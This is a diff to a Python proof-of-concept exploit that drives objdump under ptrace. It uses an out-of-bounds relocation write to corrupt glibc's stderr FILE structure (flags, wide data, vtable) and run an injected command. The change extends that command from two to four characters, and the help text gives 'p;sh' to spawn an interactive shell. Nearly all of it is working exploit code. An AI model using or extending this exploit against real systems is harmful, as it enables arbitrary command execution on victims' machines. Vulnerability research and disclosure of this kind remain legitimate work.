@@ -306,23 +306,27 @@ def compute_sym_value(desired_low26: int, cur_be32: int) -> int:
 
 # Command validation
 
-def validate_command(cmd: str) -> int:
+def validate_command(cmd: str) -> bytes:
     """
     Validate that the command satisfies FSOP constraints and return
-    the 26-bit value to write into _flags.
+    the 4-byte padded command (null-padded to length 4).
 
-    The technique writes exactly 3 bytes into _flags:
-      byte[0] = cmd[0], byte[1] = cmd[1], byte[2] = 0x00 (null terminator)
+    Writes up to 4 bytes into _flags via two relocs:
+      reloc 0 (delta-1): _flags[0,1,2] = cmd[0], cmd[1], cmd[2]
+      reloc 4 (delta+2): _flags[3] = cmd[3], padding[0,1] = 0x00
 
-    Constraints from glibc's FILE flag layout:
+    Constraints from glibc's FILE flag layout (bytes 0 and 1 only):
       cmd[0] & 0x02 == 0  → _IO_UNBUFFERED must not be set
       cmd[0] & 0x08 == 0  → _IO_NO_WRITES must not be set
       cmd[1] & 0x20 != 0  → _IO_IS_FILEBUF must be set
-    """
-    if len(cmd) != 2:
-        sys.exit(f"[!] Command must be exactly 2 characters (3-byte write constraint)")
+      cmd[2], cmd[3]: unconstrained
 
-    b = (cmd + "\x00").encode()[:3]
+    Examples: "ps", "p;sh" (→ shell), "p;ls", "p;id"
+    """
+    if not (2 <= len(cmd) <= 4):
+        sys.exit(f"[!] Command must be 2 to 4 characters")
+
+    b = (cmd + "\x00\x00\x00").encode()[:4]
 
     if b[0] & 0x0A:
         sys.exit(
@@ -335,9 +339,8 @@ def validate_command(cmd: str) -> int:
             f"_IO_IS_FILEBUF (bit 5) not set"
         )
 
-    cmd_low26 = (b[0] << 16) | (b[1] << 8) | b[2]
-    print(f"[*] cmd = {cmd!r}  low26 = {cmd_low26:#08x}")
-    return cmd_low26
+    print(f"[*] cmd = {cmd!r}  bytes = {list(hex(x) for x in b)}")
+    return b
 
 
 # Main exploit logic
@@ -357,7 +360,9 @@ def exploit(cmd: str = "ps") -> bool:
         sys.exit(f"[!] {OBJDUMP_BIN} not found — build binutils with DLX target")
 
     libc_name = resolve_libc_name()
-    cmd_low26 = validate_command(cmd)
+    cmd_bytes = validate_command(cmd)
+    cmd_low26 = (cmd_bytes[0] << 16) | (cmd_bytes[1] << 8) | cmd_bytes[2]
+    cmd_ext_low26 = ((cmd_bytes[2] & 0x03) << 24) | (cmd_bytes[3] << 16)
 
     # Fork and exec objdump under ptrace
     pid = os.fork()
@@ -530,9 +535,10 @@ def exploit(cmd: str = "ps") -> bool:
         print(f"[*] OOB off={reloc_off:#010x}->{actual_off:#010x}  data={data_addr:#x}")
 
         # Compute actual target offsets for each corrupted stderr field
-        actual_OFF_R0 = (actual_delta - 1) & 0xFFFFFFFF       # _flags
-        actual_OFF_R2 = (actual_delta + 0x9F) & 0xFFFFFFFF    # _wide_data[0:3]
-        actual_OFF_R3 = (actual_delta + 0xD7) & 0xFFFFFFFF    # vtable[0:3]
+        actual_OFF_R0   = (actual_delta - 1)    & 0xFFFFFFFF   # _flags[0:3]
+        actual_OFF_R2   = (actual_delta + 0x9F) & 0xFFFFFFFF   # _wide_data[0:3]
+        actual_OFF_R3   = (actual_delta + 0xD7) & 0xFFFFFFFF   # vtable[0:3]
+        actual_OFF_Rext = (actual_delta + 2)    & 0xFFFFFFFF   # _flags[3] + padding
 
         cur_be32 = read_be32(pid, data_addr + actual_off)
 
@@ -559,6 +565,13 @@ def exploit(cmd: str = "ps") -> bool:
             sv = compute_sym_value(desired, cur_be32)
             poke(pid, sym_ptr + 0x10, sv)
             print(f"[*] reloc3 sym->value <- {sv:#010x}  (wfile={wfile_addr:#x})")
+
+        elif actual_off == actual_OFF_Rext:
+            # Reloc 4: _flags[2] low bits + _flags[3] = cmd[3], padding[0,1] = 0
+            # This extends the command from 2 to up to 4 chars.
+            sv = compute_sym_value(cmd_ext_low26, cur_be32)
+            poke(pid, sym_ptr + 0x10, sv)
+            print(f"[*] reloc4 sym->value <- {sv:#010x}  (cmd[3]={cmd_bytes[3]:#04x})")
 
         # Single-step past the original instruction, re-arm breakpoint, continue
         regs.rip = fn_addr
@@ -587,9 +600,10 @@ def main():
     parser.add_argument(
         "--cmd", default="ps",
         help=(
-            "Command to execute (exactly 2 chars). "
+            "Command to execute (2-4 chars). "
             "Must satisfy: cmd[0] & 0x0A == 0, cmd[1] & 0x20 != 0. "
-            "Default: 'ps'"
+            "cmd[2] and cmd[3] are unconstrained. "
+            "Default: 'ps'. Example: 'p;sh' for interactive shell."
         ),
     )
     args = parser.parse_args()
